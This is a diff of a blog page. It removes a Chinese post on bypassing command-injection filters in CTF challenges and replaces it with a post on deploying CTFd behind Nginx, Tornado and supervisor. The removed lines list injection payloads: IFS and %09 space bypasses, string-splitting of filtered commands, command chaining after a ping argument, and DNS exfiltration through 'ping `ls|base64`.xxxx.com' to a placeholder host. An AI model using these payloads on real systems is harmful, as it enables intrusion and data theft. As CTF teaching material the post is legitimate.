@@ -68,7 +68,7 @@
 <link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="CTF,Sec," />
+  <meta name="keywords" content="运维,CTFd," />
 
 
 
@@ -84,16 +84,16 @@
 
 
 
-<meta name="description" content="最近在几个ctf比赛中遇到好几次远程命令执行绕过的题，网上资料比较零散，做一下整理。">
+<meta name="description" content="假期要做点简单的培训需要一个平台放题,在考虑再三后还是选择了CTFd .部署没有采用官方推荐的gunicorn而用了tornado,为了利用多核性能前面加了Nginx做反向代理,其后运行四个Tornado实例。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="RCE Bypass 远程命令执行绕过技巧">
-<meta property="og:url" content="http://www.leommxj.com/2017/06/11/RCE-Bypass/index.html">
+<meta property="og:title" content="Nginx+Tornado部署CTFd">
+<meta property="og:url" content="http://www.leommxj.com/2018/01/30/CTFd-deployment-using-Nginx-Tornado/index.html">
 <meta property="og:site_name" content="Stop Here">
-<meta property="og:description" content="最近在几个ctf比赛中遇到好几次远程命令执行绕过的题，网上资料比较零散，做一下整理。">
-<meta property="og:updated_time" content="2017-06-11T08:29:43.194Z">
+<meta property="og:description" content="假期要做点简单的培训需要一个平台放题,在考虑再三后还是选择了CTFd .部署没有采用官方推荐的gunicorn而用了tornado,为了利用多核性能前面加了Nginx做反向代理,其后运行四个Tornado实例。">
+<meta property="og:updated_time" content="2018-01-30T10:43:09.325Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="RCE Bypass 远程命令执行绕过技巧">
-<meta name="twitter:description" content="最近在几个ctf比赛中遇到好几次远程命令执行绕过的题，网上资料比较零散，做一下整理。">
+<meta name="twitter:title" content="Nginx+Tornado部署CTFd">
+<meta name="twitter:description" content="假期要做点简单的培训需要一个平台放题,在考虑再三后还是选择了CTFd .部署没有采用官方推荐的gunicorn而用了tornado,为了利用多核性能前面加了Nginx做反向代理,其后运行四个Tornado实例。">
 
 
 
@@ -111,7 +111,7 @@
   };
 </script>
 
-  <title> RCE Bypass 远程命令执行绕过技巧 | Stop Here </title>
+  <title> Nginx+Tornado部署CTFd | Stop Here </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -261,7 +261,7 @@
             
             
               
-                RCE Bypass 远程命令执行绕过技巧
+                Nginx+Tornado部署CTFd
               
             
           </h1>
@@ -273,8 +273,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2017-06-11T14:57:24+08:00" content="2017-06-11">
-              2017-06-11
+            <time itemprop="dateCreated" datetime="2018-01-30T17:34:09+08:00" content="2018-01-30">
+              2018-01-30
             </time>
           </span>
 
@@ -287,8 +287,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Sec/" itemprop="url" rel="index">
-                    <span itemprop="name">Sec</span>
+                  <a href="/categories/Operations/" itemprop="url" rel="index">
+                    <span itemprop="name">Operations</span>
                   </a>
                 </span>
 
@@ -320,19 +320,51 @@
       
 
       
-        <p>最近在几个ctf比赛中遇到好几次远程命令执行绕过的题，网上资料比较零散，做一下整理。</p>
+        <p>假期要做点简单的培训需要一个平台放题,在考虑再三后还是选择了<a href="https://github.com/CTFd/CTFd" target="_blank" rel="external">CTFd</a> .部署没有采用官方推荐的<a href="http://gunicorn.org/" target="_blank" rel="external">gunicorn</a>而用了<a href="http://www.tornadoweb.org" target="_blank" rel="external">tornado</a>,为了利用多核性能前面加了Nginx做反向代理,其后运行四个Tornado实例。</p>
 <a id="more"></a>
-<h1 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h1><p>ctf中RCE的绕过主要是靠linux中bash命令的一些特性和用法，下面从几种不同的过滤情况说明.</p>
-<h2 id="过滤了空格"><a href="#过滤了空格" class="headerlink" title="过滤了空格"></a>过滤了空格</h2><p>过滤空格的情况可以通过利用重定向符、IFS、其他字符代替、{,}等方法进行绕过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cat&lt;&gt;test.txt //重定向符</div><div class="line">cat<span class="variable">$&#123;IFS&#125;</span>text.txt //IFS</div><div class="line">cat%09test.txt //其他字符代替</div><div class="line">&#123;cat,test.txt&#125; //&#123;,&#125;</div></pre></td></tr></table></figure></p>
-<p>实际情况可能会比较复杂，比如过滤了空格和花括号，那样逗号和IFS的方法就不可行。或者过滤了逗号和重定向符，就利用IFS和%09。灵活运用。</p>
-<h2 id="过滤命令或特殊字符"><a href="#过滤命令或特殊字符" class="headerlink" title="过滤命令或特殊字符"></a>过滤命令或特殊字符</h2><p>如果过滤了某个命令，可以利用命令拼接、插入空字符串或者反单引号来绕过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">//假设过滤了ls</div><div class="line"></div><div class="line">a=l;b=s;<span class="variable">$a</span><span class="variable">$b</span> //拼接</div><div class="line"></div><div class="line">l<span class="string">''</span>s //插入空字符串</div><div class="line">l<span class="string">""</span>s //也是插入空字符串</div><div class="line"></div><div class="line">l``s //反单引号</div></pre></td></tr></table></figure></p>
-<p>这个也有很多灵活的变种，比如第一种拼接方法，如果过滤了分号，可以利用<code>%0a</code>及类似的字符来代替分号。</p>
-<p><code>a=l%0ab=s%0a$a$b</code></p>
-<p>有时候会遇到过滤文件名内容的，可以通过正则来绕过。比如flag在flag.php中但是句点被过滤了，可以构造<br><code>cat fla*</code><br>这种形式来绕过。</p>
-<h2 id="需要多条命令执行"><a href="#需要多条命令执行" class="headerlink" title="需要多条命令执行"></a>需要多条命令执行</h2><p>常见于命令执行的可控位置在某个命令之后，比如<code>ping x.x.x.x</code>这个x.x.x.x可控。我们可以通过使用管道、逻辑运算符、分号以及刚才提过的%0a编码的回车来绕过<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">ping x.x.x.x|ls //管道</div><div class="line">ping x.x.x.x;ls //分号</div><div class="line"></div><div class="line">ping x.x.x.x&amp;&amp;ls //第一个命令执行返回值正常，第二个命令才执行</div><div class="line">ping x.x.x.x||ls //如果第一个命令执行返回值正常，第二个命令就不执行了</div></pre></td></tr></table></figure></p>
-<h2 id="限制回显"><a href="#限制回显" class="headerlink" title="限制回显"></a>限制回显</h2><h3 id="回显中有限制"><a href="#回显中有限制" class="headerlink" title="回显中有限制"></a>回显中有限制</h3><p>某些特殊字符在输出的时候检测到了就会不回显,比如换行符。这种情况可以通过base64或者16进制等编码绕过。<br><code>ls|base64</code></p>
-<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>无回显可以通过curl、ping、wget等命令与Cloudeye、eye.io等结合或者发起dns查询或者http请求来获取内容。<br>比如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ping `ls|base64`.xxxx.com</div></pre></td></tr></table></figure></p>
-<h2 id="直接下载执行"><a href="#直接下载执行" class="headerlink" title="直接下载执行"></a>直接下载执行</h2><p>有时候过滤了某些字符，但是可以直接curl或者wget到脚本执行。<br>这种如果过滤了句点可以尝试将ip转换成十六进制格式，但是需要放行<code>http://</code></p>
+<p>系统: Centos7.3</p>
+<h2 id="安装前准备工作"><a href="#安装前准备工作" class="headerlink" title="安装前准备工作"></a>安装前准备工作</h2><ul>
+<li><p>因为要用到非正常端口还懒所以先关闭SELinux<br><code>setenforce 0</code><br>编辑<code>/etc/sysconfig/selinux</code>修改<code>SELINUX=disabled</code></p>
+</li>
+<li><p>安装必要软件<br><code>sudo yum install epel-release</code><br><code>sudo yum install python  python-pip</code></p>
+</li>
+</ul>
+<h2 id="安装CTFd及所需组件"><a href="#安装CTFd及所需组件" class="headerlink" title="安装CTFd及所需组件"></a>安装CTFd及所需组件</h2><ul>
+<li><p>首先clone CTFd到本地<br><code>git clone https://github.com/CTFd/CTFd.git</code></p>
+</li>
+<li><p>安装所需python库<br>切换到CTFd目录下 <code>sudo pip install -r requirements.txt</code></p>
+</li>
+</ul>
+<h2 id="安装并配置Tornado"><a href="#安装并配置Tornado" class="headerlink" title="安装并配置Tornado"></a>安装并配置Tornado</h2><ul>
+<li>安装 <code>sudo pip install tornado</code></li>
+</ul>
+<h4 id="修改CTFd启动脚本"><a href="#修改CTFd启动脚本" class="headerlink" title="修改CTFd启动脚本"></a>修改CTFd启动脚本</h4><p>修改<code>serve.py</code>内容为:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> CTFd <span class="keyword">import</span> create_app</div><div class="line"><span class="keyword">from</span> tornado.wsgi <span class="keyword">import</span> WSGIContainer</div><div class="line"><span class="keyword">import</span> tornado.httpserver</div><div class="line"><span class="keyword">import</span> tornado.ioloop</div><div class="line"><span class="keyword">import</span> tornado.web</div><div class="line"><span class="keyword">import</span> tornado.wsgi</div><div class="line"></div><div class="line"><span class="keyword">from</span> tornado.options <span class="keyword">import</span> options, define, parse_command_line</div><div class="line">define(<span class="string">"port"</span>, default=<span class="number">8000</span>, help=<span class="string">"run on the given port"</span>, type=int) <span class="comment">#传入端口参数,方便后续supervisor管理</span></div><div class="line"></div><div class="line">app = create_app()</div><div class="line">server = tornado.httpserver.HTTPServer(WSGIContainer(app))</div><div class="line">tornado.options.parse_command_line()</div><div class="line">server.listen(options.port)</div><div class="line">tornado.ioloop.IOLoop.instance().start()</div></pre></td></tr></table></figure></p>
+<p><code>python serve.py</code>启动,可以本机wget一下8000端口看是否成功访问,这里由于还没添加防火墙规则外界无法访问.</p>
+<h4 id="利用supervisor控制Tornado进程"><a href="#利用supervisor控制Tornado进程" class="headerlink" title="利用supervisor控制Tornado进程"></a>利用supervisor控制Tornado进程</h4><ul>
+<li><p>安装supervisor <code>sudo pip install supervisor</code></p>
+</li>
+<li><p>用 <code>echo_supervisord_conf</code>创建默认配置文件<br><code>sudo sh -c &quot;echo_supervisor_conf &gt; /etc/supervisord.conf&quot;</code><br>由于有重定向这里不能直接使用<code>sudo echo_supervisor_conf &gt; /etc/supervisord.conf</code>,因为sudo会只执行了重定向前面的命令，而需要利用<code>sh -c &quot;command&quot;</code>来执行。每次都要打错一边T。T</p>
+</li>
+<li><p>向配置文件中添加进程组</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">[program:ctfd]</div><div class="line">command=python /home/leommxj/CTFd/serve.py --port=80%(process_num)02d</div><div class="line">directory=/home/leommxj/CTFd</div><div class="line">process_name = %(program_name)s%(process_num)d</div><div class="line">autorestart=true</div><div class="line">redirect_stderr=true</div><div class="line">stdout_logfile=/home/leommxj/CTFd/log/tornado.log</div><div class="line">stdout_logfile_maxbytes=500MB</div><div class="line">stdout_logfile_backups=50</div><div class="line">stderr_logfile=/home/leommxj/CTFd/log/tornado.log</div><div class="line">loglevel=info</div><div class="line">numprocs = 4</div><div class="line">numprocs_start = 1</div></pre></td></tr></table></figure>
+<p>通过传入port参数控制端口号，这里生成四个进程分别用 8001-8004四个端口</p>
+</li>
+<li><p>启动supervisord <code>supervisord</code><br>查看进程状况 <code>supervisorctl status</code><br>运行正常如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ctfd:ctfd1                       RUNNING   pid 12451, uptime 1:27:34</div><div class="line">ctfd:ctfd2                       RUNNING   pid 12452, uptime 1:27:34</div><div class="line">ctfd:ctfd3                       RUNNING   pid 12453, uptime 1:27:34</div><div class="line">ctfd:ctfd4                       RUNNING   pid 12454, uptime 1:27:34</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="安装并配置Nginx反向代理"><a href="#安装并配置Nginx反向代理" class="headerlink" title="安装并配置Nginx反向代理"></a>安装并配置Nginx反向代理</h2><ul>
+<li><p>安装 <code>sudo yum install nginx</code></p>
+</li>
+<li><p>编辑<code>\etc\nginx\nginx.conf</code>删除其中原有的80端口服务</p>
+</li>
+<li><p>新建<code>\etc\nginx\conf.d\ctfd.conf</code>配置反向代理</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">upstream tornado&#123;</div><div class="line">	server 127.0.0.1:8001;</div><div class="line">	server 127.0.0.1:8002;</div><div class="line">	server 127.0.0.1:8003;</div><div class="line">	server 127.0.0.1:8004;</div><div class="line">&#125;</div><div class="line"></div><div class="line">server&#123;</div><div class="line">	listen 666;</div><div class="line">	location /&#123;</div><div class="line">		proxy_pass_header Server;</div><div class="line">		proxy_set_header Host $http_host;</div><div class="line">		proxy_redirect off;</div><div class="line">		proxy_set_header X-Real_IP $remote_addr;</div><div class="line">		proxy_pass http://tornado;</div><div class="line">	&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+</li>
+<li><p>防火墙添加规则开放端口,centos7默认使用firewall-cmd而不是iptables了,尝试一下新东西.<br><code>firewall-cmd --permanent --add-port=666/tcp</code></p>
+</li>
+</ul>
+<p>配置完毕,不太懂ctfd静态文件位置没有配置nginx直接处理静态文件,有时间加上.</p>
 
       
     </div>
@@ -354,9 +386,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/CTF/" rel="tag">#CTF</a>
+            <a href="/tags/运维/" rel="tag">#运维</a>
           
-            <a href="/tags/Sec/" rel="tag">#Sec</a>
+            <a href="/tags/CTFd/" rel="tag">#CTFd</a>
           
         </div>
       
@@ -365,17 +397,13 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/02/08/AlexCTF-Writeup/" rel="next" title="AlexCTF-Writeup">
-                <i class="fa fa-chevron-left"></i> AlexCTF-Writeup
+              <a href="/2017/12/17/Car-Hacking-101-智能汽车攻防/" rel="next" title="Car Hacking 101/智能汽车攻防">
+                <i class="fa fa-chevron-left"></i> Car Hacking 101/智能汽车攻防
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/10/02/2017XDCTF-Writeup/" rel="prev" title="2017XDCTF-Writeup">
-                2017XDCTF-Writeup <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -502,7 +530,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Bypass"><span class="nav-number">1.</span> <span class="nav-text">Bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#过滤了空格"><span class="nav-number">1.1.</span> <span class="nav-text">过滤了空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#过滤命令或特殊字符"><span class="nav-number">1.2.</span> <span class="nav-text">过滤命令或特殊字符</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#需要多条命令执行"><span class="nav-number">1.3.</span> <span class="nav-text">需要多条命令执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#限制回显"><span class="nav-number">1.4.</span> <span class="nav-text">限制回显</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#回显中有限制"><span class="nav-number">1.4.1.</span> <span class="nav-text">回显中有限制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#无回显"><span class="nav-number">1.4.2.</span> <span class="nav-text">无回显</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#直接下载执行"><span class="nav-number">1.5.</span> <span class="nav-text">直接下载执行</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装前准备工作"><span class="nav-number">1.</span> <span class="nav-text">安装前准备工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装CTFd及所需组件"><span class="nav-number">2.</span> <span class="nav-text">安装CTFd及所需组件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装并配置Tornado"><span class="nav-number">3.</span> <span class="nav-text">安装并配置Tornado</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#修改CTFd启动脚本"><span class="nav-number">3.0.1.</span> <span class="nav-text">修改CTFd启动脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#利用supervisor控制Tornado进程"><span class="nav-number">3.0.2.</span> <span class="nav-text">利用supervisor控制Tornado进程</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装并配置Nginx反向代理"><span class="nav-number">4.</span> <span class="nav-text">安装并配置Nginx反向代理</span></a></li></ol></div>
             
           </div>
         </section>
